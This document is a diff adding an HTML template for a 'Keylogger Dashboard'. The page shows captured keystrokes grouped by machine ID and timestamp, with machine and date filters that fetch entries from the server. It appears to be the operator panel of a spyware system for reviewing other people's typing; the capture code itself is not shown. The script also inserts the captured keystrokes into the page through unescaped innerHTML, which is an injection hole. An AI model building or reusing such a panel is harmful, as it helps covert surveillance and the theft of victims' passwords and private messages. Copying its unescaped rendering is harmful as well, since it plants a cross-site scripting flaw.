@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Keylogger Dashboard</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        .keylog-entry {
+            margin-bottom: 20px;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .timestamp {
+            color: #666;
+            font-size: 0.9em;
+        }
+        .machine-id {
+            font-weight: bold;
+            color: #007bff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container mt-4">
+        <h1 class="mb-4">Keylogger Dashboard</h1>
+        
+        <div class="row mb-4">
+            <div class="col">
+                <select id="machineFilter" class="form-select">
+                    <option value="">Toutes les machines</option>
+                    {% for machine in machines %}
+                    <option value="{{ machine }}">{{ machine }}</option>
+                    {% endfor %}
+                </select>
+            </div>
+            <div class="col">
+                <input type="date" id="dateFilter" class="form-control">
+            </div>
+        </div>
+
+        <div id="keylogEntries">
+            {% for entry in entries %}
+            <div class="keylog-entry">
+                <div class="machine-id">{{ entry.machine_id }}</div>
+                <div class="timestamp">{{ entry.timestamp }}</div>
+                <div class="keystrokes">{{ entry.keystrokes }}</div>
+            </div>
+            {% endfor %}
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('machineFilter').addEventListener('change', filterEntries);
+        document.getElementById('dateFilter').addEventListener('change', filterEntries);
+
+        function filterEntries() {
+            const machine = document.getElementById('machineFilter').value;
+            const date = document.getElementById('dateFilter').value;
+            
+            fetch(`/filter?machine=${machine}&date=${date}`)
+                .then(response => response.json())
+                .then(data => {
+                    const container = document.getElementById('keylogEntries');
+                    container.innerHTML = '';
+                    
+                    data.forEach(entry => {
+                        container.innerHTML += `
+                            <div class="keylog-entry">
+                                <div class="machine-id">${entry.machine_id}</div>
+                                <div class="timestamp">${entry.timestamp}</div>
+                                <div class="keystrokes">${entry.keystrokes}</div>
+                            </div>
+                        `;
+                    });
+                });
+        }
+    </script>
+</body>
+</html> 
